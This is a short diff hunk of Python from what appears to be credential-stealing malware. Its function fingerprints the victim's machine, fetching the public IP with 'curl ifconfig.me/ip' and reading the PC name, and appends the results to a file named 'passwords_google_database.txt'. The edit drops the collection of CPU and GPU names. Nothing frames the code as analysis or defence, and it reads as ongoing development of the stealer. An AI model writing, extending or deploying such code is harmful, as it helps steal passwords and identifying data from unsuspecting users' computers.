@@ -310,13 +310,9 @@ def get_pc_name_and_public_ip():
 
         ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode()
 
-        cpu = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]
-
-        gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')[1]
-
         with open('passwords_google_database.txt', 'a') as f:
 
-            f.writelines(['*'*50, '\n', f'PC Name: {pc_name}', '\n', f'CPU: {cpu}', '\n', f'GPU: {gpu}', '\n', f'Public IP: {ip}', '\n' , '*'*50, '\n\n'])
+            f.writelines(['*'*50, '\n', f'PC Name: {pc_name}', '\n', f'Public IP: {ip}', '\n' , '*'*50, '\n\n'])
 
             f.close() 
 
